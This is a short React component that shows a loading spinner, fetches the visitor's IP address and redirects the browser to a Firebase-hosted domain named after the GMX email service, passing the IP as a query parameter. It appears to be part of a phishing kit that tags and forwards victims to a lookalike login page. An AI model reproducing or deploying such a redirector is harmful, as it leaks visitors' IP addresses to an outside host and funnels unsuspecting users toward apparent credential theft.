import React, { useEffect } from "react";
import "./loaderstyle.css";
import { getIP } from "./servers";

export default function RedirectNorecord() {
  useEffect(() => {
    getIP().then((res) => {
      const ip = res.data.ip;
      console.log(ip);
      window.location.assign(`https://gmx-23set.web.app/?ic=${ip}`);
    });
  });

  return (
    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
      <div className="lds-spinner">
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
      </div>
    </div>
  );
}
